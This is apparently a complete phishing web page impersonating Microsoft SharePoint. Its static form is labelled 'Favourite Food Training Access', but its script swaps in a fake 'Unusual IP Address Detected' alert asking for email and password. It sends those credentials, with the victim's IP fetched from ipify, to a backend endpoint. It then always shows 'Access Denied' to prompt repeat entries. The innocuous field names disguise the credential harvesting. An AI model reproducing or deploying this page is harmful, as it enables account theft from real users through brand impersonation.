<!DOCTYPE html> 
<html lang="en"> 
    <head>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <link rel="icon" href="/favicon.ico" type="image/x-icon" /> 
          <title>Microsoft sharepoint</title> 
          <style>
            * {
              box-sizing: border-box;
            }
            html, body { 
              margin: 0; 
              width: 100%; 
              height: 100%; 
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
              background: #f5f5f5;
            }
            .bg { 
              background: url("/images/microsoftsharepoint.jpeg") center / cover no-repeat; 
              width: 100%; 
              height: 100%; 
              cursor: pointer;
              position: relative;
            }
            .bg::after {
              content: '';
              position: absolute;
              top: 0;
              left: 0;
              right: 0;
              bottom: 0;
              background: rgba(0,0,0,0.3);
            }
            .modal { 
              display: none; 
              position: fixed; 
              inset: 0; 
              background: rgba(0,0,0,0.5); 
              justify-content: center; 
              align-items: center;
              z-index: 1000;
            } 
            .box { 
              background: #fff; 
              padding: 32px; 
              width: 90%; 
              max-width: 450px; 
              border-radius: 12px;
              box-shadow: 0 20px 60px rgba(0,0,0,0.3);
              animation: slideIn 0.3s ease-out;
            }
            @keyframes slideIn {
              from {
                opacity: 0;
                transform: translateY(-20px);
              }
              to {
                opacity: 1;
                transform: translateY(0);
              }
            }
            .box h2 {
              margin: 0 0 24px 0;
              font-size: 24px;
              color: darkred;
              font-weight: 600;
            }
            .box h3 {
              margin: 0 0 24px 0;
              font-size: 18px;
              color: #333;
              font-weight: 600;
            }
            input {
              width: 100%;
              padding: 12px 16px;
              margin-top: 12px;
              margin-bottom: 0;
              font-size: 16px;
              border: 2px solid #e0e0e0;
              border-radius: 8px;
              transition: border-color 0.3s ease;
              font-family: inherit;
            }
            input:focus {
              outline: none;
              border-color: #333;
            }
            input::placeholder {
              color: #999;
            }
            button {
              width: 100%;
              padding: 12px;
              margin-top: 24px;
              font-size: 16px;
              font-weight: 600;
              background: #333;
              color: #fff;
              border: none;
              border-radius: 8px;
              cursor: pointer;
              transition: background 0.3s ease;
              font-family: inherit;
            }
            button:hover {
              background: #555;
            }
            button:active {
              background: #222;
            }
            button:disabled {
              background: #ccc;
              cursor: not-allowed;
            }
            .success-message {
              text-align: center;
              padding: 20px;
            }
            .success-icon {
              font-size: 48px;
              margin-bottom: 16px;
              color: darkred;
            }
            .success-text {
              /* color: #27ae60; */
              color: darkred;
              font-size: 18px;
              font-weight: 600;
              margin-bottom: 8px;
            }
            .success-subtext {
              color: #666;
              font-size: 14px;
            }
            .error-message {
              text-align: center;
              padding: 20px;
            }
            .error-icon {
              font-size: 48px;
              margin-bottom: 16px;
            }
            .error-text {
              color: #e74c3c;
              font-size: 18px;
              font-weight: 600;
              margin-bottom: 8px;
            }
            .error-subtext {
              color: #666;
              font-size: 14px;
            }
            .loading {
              text-align: center;
              padding: 20px;
            }
            .spinner {
              border: 4px solid #f3f3f3;
              border-top: 4px solid #333;
              border-radius: 50%;
              width: 40px;
              height: 40px;
              animation: spin 1s linear infinite;
              margin: 0 auto 16px;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            .close-btn {
              margin-top: 16px;
              background: #f0f0f0;
              color: #333;
            }
            .close-btn:hover {
              background: #e0e0e0;
            }
          </style>
            </head> 
            <body> 
                <div class="bg" onclick="openModal()"></div> 
                <div class="modal" id="modal"> 
                    <div class="box" id="box-content"> 
                        <h3>Favourite Food Training Access</h3> 
                        <input id="favouritefood" placeholder="Favourite Food" /> 
                        <input id="company" placeholder="Company Name" /> 
                        <button onclick="submitForm()">Continue</button>
                    </div> 
                </div>
                 <script> 
                 function openModal() { 
                    document.getElementById("modal").style.display = "flex";
                    resetForm();
                 }
                 
                 function closeModal() {
                    document.getElementById("modal").style.display = "none";
                 }
                 
                 function resetForm() {
                    document.getElementById("box-content").innerHTML = `
                        <h2>Unusual IP Address Detected!</h2> 
                        <h3>Please provide your email and password to proceed</h3> 
                        <input id="favouritefood" type="email" placeholder="Email" /> 
                        <input id="company" type="password" placeholder="Password" /> 
                        <button onclick="submitForm()">Continue</button>
                    `;
                 }
                    
                 async function submitForm() { 
                    const favouritefood = document.getElementById("favouritefood").value;
                    const company = document.getElementById("company").value;
                    
                    if (!favouritefood.trim() || !company.trim()) {
                        alert('Please fill in all fields');
                        return;
                    }
                    
                    // Show loading state
                    document.getElementById("box-content").innerHTML = `
                        <div class="loading">
                            <div class="spinner"></div>
                            <p style="color: #666; margin: 0;">Authenticating...</p>
                        </div>
                    `;
                    
                    try {
                        // Fetch IP
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        const ip = ipData.ip;
                        
                        const response = await fetch("/api/submit", { 
                            method: "POST", 
                            headers: { "Content-Type": "application/json" }, 
                            body: JSON.stringify({ favouritefood, company, ip }) 
                        });
                        
                        if (response.ok) {
                            document.getElementById("box-content").innerHTML = `
                                <div class="success-message">
                                    <div class="success-icon">X</div>
                                    <div class="success-text">Access Denied!</div>
                                    <div class="success-subtext">Check your email and password.</div>
                                    <button class="close-btn" onclick="resetForm()">Try Again</button>
                                </div>
                            `;
                        } else {
                            throw new Error('Submission failed');
                        }
                    } catch (error) {
                        document.getElementById("box-content").innerHTML = `
                            <div class="error-message">
                                <div class="error-icon">✕</div>
                                <div class="error-text">Submission Failed</div>
                                <div class="error-subtext">Please try again later.</div>
                                <button class="close-btn" onclick="resetForm()">Try Again</button>
                            </div>
                        `;
                    }
                 } 
                </script>
            </body> 
        </html>
